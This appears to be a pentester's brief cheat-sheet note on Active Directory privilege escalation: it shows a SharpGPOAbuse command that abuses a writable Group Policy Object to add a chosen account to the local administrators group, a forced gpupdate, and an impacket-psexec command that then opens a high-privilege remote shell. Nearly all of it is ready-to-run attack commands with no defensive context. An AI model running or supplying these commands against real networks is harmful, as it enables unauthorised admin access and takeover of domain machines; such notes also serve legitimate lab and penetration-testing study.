# if you can write to gpo

use SharpGPOAbuse.exe
see https://github.com/FSecureLABS/SharpGPOAbuse for more infos

```cmd
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <username> --GPOName "vulnerablegponame"
```

and update gpo after

```cmd
gpupdate /force
```

## switch user after adding user to group

after you add your user to local admin group use impacket to switch to high priv user

```cmd
impacket-psexec <domain>/<user>@"$rhost"
```
